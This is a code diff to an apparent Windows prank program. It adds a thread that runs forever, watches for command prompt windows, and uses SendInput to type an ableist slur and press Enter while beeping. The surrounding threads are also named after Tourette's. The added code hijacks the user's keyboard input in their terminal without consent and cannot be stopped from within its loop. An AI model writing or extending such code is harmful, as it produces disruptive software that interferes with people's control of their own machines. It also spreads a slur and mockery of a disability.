@@ -301,11 +301,60 @@ void AfterEight()
     }
 }
 
+void TourettesCMD()
+{
+    constexpr DWORD kd = 100;
+    constexpr size_t msglength = 11;
+    size_t keyIndex = 0;
+    WORD keys[11] = {
+        'L','O','L',VK_SPACE,'R','E','T','A','R','D',VK_RETURN
+    };
+    DWORD delay[11] = {
+        kd,kd,kd,kd,kd,kd,kd,kd,kd,kd,1000
+    };
+    while (1)
+    {
+        bool found = false;
+        std::vector<WindowTitle> titles;
+        EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&titles));
+        for (auto t : titles)
+        {
+            const size_t findsubstr = t.title.find(L"command prompt");
+            if (findsubstr != std::string::npos)
+            {
+                found = true;
+            }
+        }
+        if (!found)
+        {
+            keyIndex = 0;
+            Sleep(100);
+        }
+        else
+        {
+            KEYBDINPUT keyinput;
+            keyinput.wVk = keys[keyIndex];
+            keyinput.wScan = 0;
+            keyinput.dwFlags = 0;
+            keyinput.time = 0;
+            keyinput.dwExtraInfo = 0;
+            INPUT input;
+            input.type = INPUT_KEYBOARD;
+            input.ki = keyinput;
+            SendInput(1, &input, sizeof(input));
+            PlaySound(MAKEINTRESOURCE(IDR_BEEP), hInst, SND_RESOURCE | SND_ASYNC);
+            Sleep(delay[keyIndex++]);
+            keyIndex %= msglength;
+        }
+    }
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int iCmdShow)
 {
     std::thread t1(TourettesWindows);
     std::thread t2(TourettesRandom);
     std::thread t3(AfterEight);
+    std::thread t4(TourettesCMD);
     LPWSTR cline = GetCommandLineW();
     int argc;
     LPWSTR* argv = CommandLineToArgvW(cline, &argc);
